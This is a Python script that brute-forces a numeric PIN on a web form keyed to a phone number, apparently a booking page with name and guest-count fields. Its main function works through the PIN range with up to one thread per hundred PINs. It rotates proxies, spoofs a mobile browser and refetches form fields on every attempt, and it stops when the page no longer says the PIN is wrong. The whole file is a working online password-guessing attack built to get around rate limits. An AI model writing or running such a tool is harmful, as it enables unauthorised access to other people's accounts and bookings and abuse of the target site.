import sys
import itertools
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum

import requests
from bs4 import BeautifulSoup

import settings

CHUNK_SIZE = 100  # one thread per 100 PINs


class UserAgent(str, Enum):
    ANDROID = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36"
    IOS     = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
    DESKTOP = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"


HEADERS = {
    "User-Agent": UserAgent.ANDROID,
    "Referer": settings.URL,
}

_proxy_cycle = itertools.cycle(settings.PROXIES) if settings.PROXIES else None
_proxy_lock = threading.Lock()


def make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update(HEADERS)
    if _proxy_cycle:
        with _proxy_lock:
            proxy = next(_proxy_cycle)
        s.proxies.update({"http": proxy, "https": proxy})
    return s


def get_form_fields(html: str) -> dict:
    soup = BeautifulSoup(html, "html.parser")
    fields = {}
    for inp in soup.find_all("input"):
        name = inp.get("name")
        if name:
            fields[name] = inp.get("value", "")
    for sel in soup.find_all("select"):
        name = sel.get("name")
        if name:
            option = sel.find("option", selected=True) or sel.find("option")
            fields[name] = option.get("value", "") if option else ""
    for btn in soup.find_all(["input", "button"], type="submit"):
        name = btn.get("name")
        if name and name not in fields:
            fields[name] = btn.get("value", "")
            break
    return fields


def get_visible_text(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    for tag in soup(["script", "style", "input", "select", "option"]):
        tag.decompose()
    return " ".join(soup.get_text(separator=" ").split()).lower()


def find_field(fields: dict, *keywords) -> str | None:
    for key in fields:
        for kw in keywords:
            if kw.lower() in key.lower():
                return key
    return None


class ResponseState(Enum):
    FORM    = "form"
    FAIL    = "fail"
    SUCCESS = "success"
    ERROR   = "error"


def classify(response: requests.Response) -> ResponseState:
    if response.status_code != 200:
        return ResponseState.ERROR
    text = get_visible_text(response.text)
    if "pin is not correct" in text:
        return ResponseState.FAIL
    if response.url == settings.URL:
        return ResponseState.FORM
    return ResponseState.SUCCESS


def get_form_action(html: str, base_url: str) -> str:
    from urllib.parse import urljoin
    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if form and form.get("action"):
        action = form["action"]
        return action if action.startswith("http") else urljoin(base_url, action)
    return base_url


def build_payload(fields: dict, name_field, phone_field, pin_field, adults_field, children_field, pin: int) -> dict:
    payload = fields.copy()
    if name_field and settings.MY_NAME:
        payload[name_field] = settings.MY_NAME
    payload[phone_field] = settings.PHONE
    payload[pin_field] = str(pin)
    if adults_field:
        payload[adults_field] = str(settings.ADULTS)
    if children_field:
        # DDLP2 values are offset: value="1" means 0 children, value="2" means 1 child, etc.
        payload[children_field] = str(settings.CHILDREN + 1)
    return payload


def fetch_fresh(url: str, session: requests.Session) -> tuple[dict, str]:
    resp = session.get(url, timeout=15)
    resp.raise_for_status()
    return get_form_fields(resp.text), resp.text


# Shared state for threads
_print_lock = threading.Lock()
_found_event = threading.Event()
_counter = [0]
_counter_lock = threading.Lock()


def try_chunk(
    pins: list[int],
    action_url: str,
    name_field, phone_field, pin_field, adults_field, children_field,
    total: int,
) -> tuple[int, requests.Response] | None:
    """Try a chunk of PINs sequentially. Returns (pin, response) on success, None otherwise."""
    for pin in pins:
        if _found_event.is_set():
            return None

        session = make_session()
        try:
            fresh_fields, _ = fetch_fresh(settings.URL, session)
            payload = build_payload(fresh_fields, name_field, phone_field, pin_field, adults_field, children_field, pin)
            post_resp = session.post(action_url, data=payload, timeout=15, allow_redirects=True)
        except requests.RequestException as e:
            with _print_lock:
                print(f"\n[!] Error on PIN {pin}: {e}")
            time.sleep(1)
            continue

        state = classify(post_resp)

        with _counter_lock:
            _counter[0] += 1
            i = _counter[0]

        pct = i / total * 100
        with _print_lock:
            print(f"\r[{i}/{total}] {pct:.1f}%  PIN: {pin:05d} | {state.value}    ", end="", flush=True)

        if state == ResponseState.SUCCESS:
            _found_event.set()
            return pin, post_resp

        if settings.DELAY > 0:
            time.sleep(settings.DELAY)

    return None


def main():
    print(f"[*] Fetching page: {settings.URL}")
    session = make_session()
    fields, page_html = fetch_fresh(settings.URL, session)
    action_url = get_form_action(page_html, settings.URL)

    print(f"[*] Form action: {action_url}")
    print(f"[*] Discovered {len(fields)} form fields:")
    for name, val in fields.items():
        display = val if len(val) < 60 else val[:57] + "..."
        print(f"    {name!r} = {display!r}")

    name_field     = find_field(fields, "name", "fullname", "username", "cust")
    phone_field    = find_field(fields, "phone", "mobile", "tel", "handphone", "contact", "hp", "no")
    pin_field      = find_field(fields, "pin", "password", "pass", "pwd", "code", "ic")
    adults_field   = find_field(fields, "adult", "pax", "guest", "DDLP1")
    children_field = find_field(fields, "child", "kid", "children", "DDLP2")

    print(f"\n[*] Detected name field    : {name_field!r}")
    print(f"[*] Detected phone field   : {phone_field!r}")
    print(f"[*] Detected PIN field     : {pin_field!r}")
    print(f"[*] Detected adults field  : {adults_field!r}")
    print(f"[*] Detected children field: {children_field!r}")

    if not phone_field or not pin_field:
        print("\n[!] Could not auto-detect phone/PIN fields.")
        print("[!] Available fields:", list(fields.keys()))
        sys.exit(1)

    if not settings.PHONE:
        print("\n[!] PHONE is not set in .env")
        sys.exit(1)

    full_range = range(settings.PIN_START, settings.PIN_END + 1)
    priority = settings.PRIORITY_RANGE or range(0, 0)
    priority_set = set(priority)
    avoid = settings.PINS_TO_AVOID
    pin_sequence = [p for p in priority if p not in avoid] + [p for p in full_range if p not in priority_set and p not in avoid]
    total = len(pin_sequence)

    # Split into chunks of CHUNK_SIZE
    chunks = [pin_sequence[i:i + CHUNK_SIZE] for i in range(0, total, CHUNK_SIZE)]
    num_threads = len(chunks)

    print(f"\n[*] Name   : {settings.MY_NAME or '(not set)'}")
    print(f"[*] Phone  : {settings.PHONE}")
    print(f"[*] Adults : {settings.ADULTS}  Children: {settings.CHILDREN}")
    print(f"[*] PIN range  : {settings.PIN_START} – {settings.PIN_END}")
    if settings.PRIORITY_RANGE:
        print(f"[*] Priority   : {settings.PRIORITY_RANGE.start} – {settings.PRIORITY_RANGE.stop - 1} (tried first)")
    print(f"[*] Threads    : {num_threads} ({CHUNK_SIZE} PINs each)")
    print(f"[*] Delay      : {settings.DELAY}s\n")

    result = None
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [
            executor.submit(try_chunk, chunk, action_url, name_field, phone_field, pin_field, adults_field, children_field, total)
            for chunk in chunks
        ]
        for future in as_completed(futures):
            outcome = future.result()
            if outcome is not None:
                result = outcome
                break

    if result:
        pin, resp = result
        print(f"\n\n[+] SUCCESS! PIN found: {pin}")
        print(f"[+] Response URL: {resp.url}")
        print(f"[+] Page text: {get_visible_text(resp.text)[:300]}")
    else:
        print(f"\n\n[-] No valid PIN found in range {settings.PIN_START}–{settings.PIN_END}.")


if __name__ == "__main__":
    main()
